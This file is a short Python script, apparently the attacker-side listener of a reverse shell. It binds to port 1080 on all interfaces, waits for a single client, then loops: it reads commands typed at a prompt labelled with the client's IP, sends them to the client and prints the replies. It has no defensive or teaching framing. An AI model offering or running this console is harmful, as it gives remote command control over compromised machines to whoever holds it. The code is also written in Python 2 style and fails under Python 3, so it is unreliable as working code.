import socket

HOST = '0.0.0.0'  
PORT = 1080  

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

server_socket.bind((HOST, PORT))

server_socket.listen(5)  
print("\n Listening on port " +str(PORT)+ ", waiting for client to connect...")


client_socket, (client_ip, client_port) = server_socket.accept()
print("[+] Client " +client_ip+ " connected!\n")


while True:
    try:
        command = input(client_ip+ ">")
        if(len(command.split()) != 0):
            client_socket.send(command)
        else:
            continue
    except Exception:
        print("[-]Something went wrong")
        continue

    if(command == "stop"):
        break

    data = client_socket.recv(1024)
    print(data + "\n")

client_socket.close()
